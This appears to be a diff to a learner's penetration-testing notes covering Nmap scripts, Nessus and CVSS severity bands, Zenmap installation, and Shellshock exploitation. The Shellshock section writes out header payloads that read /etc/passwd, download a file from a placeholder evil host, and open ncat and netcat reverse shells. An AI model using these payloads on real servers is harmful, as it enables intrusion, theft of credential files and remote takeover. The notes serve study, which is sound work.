@@ -222,6 +222,8 @@ nmap can be used for script scaning, OS detection - other options: version detec
 
 - We can scan specific ports for example `5900` for remote desktop, `6667` for IRC (Internet Relay Chat) service- a backdoor communicatio channel for botnets and trojan downloaders. If these ports show up as open on the scan its a significant vulnerability
 
+- `zenmap` is a software that makes it easy to examine results of the nmap scan with a user interface
+
 **Other methods of scanning**
 - One method is shown above
 - massscan
@@ -246,11 +248,52 @@ nmap can be used for script scaning, OS detection - other options: version detec
 **Nmap Scripting Engine NSE**
 
 - These are scripts that are run on the results of the initial scan to search the web for what exploits are available
-- This is a preinatalled collection of scripts that come with Nmap
+- This is a preinatalled collection of scripts that come with Nmap, about 600
+- `ls /usr/share/nmap/scripts` to display the current scripts
+- Most scripts are for infomation gathering, but some can be used for automating networking tasks
+ - DNS enumeration
+   - Brute force attack
+   - OS fingerprinting
+   - Banner grabbing
+   - Vulnerability detection
+   - Vulnerability exploitation
+   - Backdoor identification
+   - Malware discovery
+
+
+- It is mostly useful for perfoming single host scans and basic information gathering or enumeration
+- It does not detect all vulnerabilities and it cannot run multiple scans simultaneously
+
+
+**Nessus/ Vulnerability scans**
+- NSE scan is weaker than a vulnerability scan. An example of vulnerability scan includes Nessus
+
+- these scan the network using a known database of vulnerabilities **National Vulnerability Databse (NBV)** [NVB](nvd.nist.gov), whcih are rated based on the severity and are assigned a common vulnerability score (CVSS) and catwgory (low, medium, high, critical) of severity based on the score. 
+
+Critical: 10.0.
+High: 7.0 - 9.9.
+Medium: 4.0 - 6.9.
+Low: 0.1 - 3.9.
+Info: 0
+
+- In contrast with penetration testing there is no exploitation of weaknesses
+
+- Other vulnerability scans include `Nexpose`-developed by  Rapid7, fully integerted with metasploit, and can be deployed with cloud, 
 
 
 
+**Zenmap**
 
+- Its an official Nmap Security GUI (graphical user interface). Update- ok its cool to know that this software exists
+but its such a hassal to install- not worth trying- so I am going to pass. The below commands dont work anymore
+
+- ` apt-get update` to update Kali
+-  `apt-get install alien` to download zenmap - Note that this is not installation this is just download
+- `alien zenmap-7.80-1.noarch.rpm` convert to deb file from rpm before it can be used
+- `dpkg -i zenmap_7.80-2_all.deb` this will install zenmap after download
+
+- apt list --installed | grep alien to check if it is installed
+- 
 
 **Drbuster**
 - `http://<ipaddress>:80`, then you supply the wordlist. You are trying to brute force the directories. Then you specify extensions like (asm, asmx, asp, aspx, txt, zip, rar, php-if apache webserver)
@@ -281,6 +324,67 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 
 
 ## Exploitation
+
+**Remote code execution (RCE)**
+-  This is the process of runing a bash code during exploitation
+
+**Shell shock**
+- Shell shock is a software that allows you to execute bash script code on a remote server. This is done by exploiting **common gateway interface** which is a protocol that handles requests for running scripts on the server. 
+
+- Why this becomes problematic is because it gives a hacker the power to load malacious bash scripts as environment variables into the HTTP header- which can potentially elevate priviliges and allow:
+
+    - Download of sensitive data
+    - Send and receive shells to and from the target
+    - Backdoor the victim
+
+- Command syntax `/bin/bash -c 'command'`. Note that a code contained in the bash script that is used for exploitation is called **payload**
+
+- you can alter the script using shell shock. For example:
+
+
+ ```bash
+  GET /index.html HTTP/1.1
+  Host: example.com
+  User-Agent: curl
+  Connection: keep-alive
+  ```
+
+
+  ```bash
+  GET /index.html HTTP/1.1
+  Host: example.com
+  User-Agent: () { :;};
+  Connection: keep-alive
+  ```
+
+- Likewise you can run malacious code to open passwd file
+
+   - For example: 
+
+   ```bash
+   GET /index.html HTTP/1.1
+   Host: example.com
+   User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
+   Connection: keep-alive
+   ```
+
+- likewise other ways of exploiting the code include downloading a file from a website
+```
+     User-Agent: () { :;}; /bin/bash -c 'curl -O http://evil.site/mal.php'
+
+     -O downloads and saves the file with url name
+```
+
+- We can also use this to open a listening port using the ncat command from the victim machine. This is also called opening a reverse shell script. 
+
+```
+User-Agent: () { :;}; /bin/bash -c 'ncat <ip address>'
+```
+
+- But before this command can be run, a listening port must be open on the host
+
+- `ncat -lvp 4444`
+
 
 - **Metasploit COmmands**
 - `msfconsole`
@@ -321,7 +425,7 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
 - poping a shell means gaining access to a machine
 
 **Reverse Shell**
--`nc -nvlp 444` attack box (lvp means listening verbose port)
+-`nc -nvlp 4444` attack box (lvp means listening verbose port)
 -`nc 192.168.1.1 4444 -e /bin/sh` This is telling the victim machine to connect to the ip address of my attack machine 
 - Whenever a victim connects back to 
 
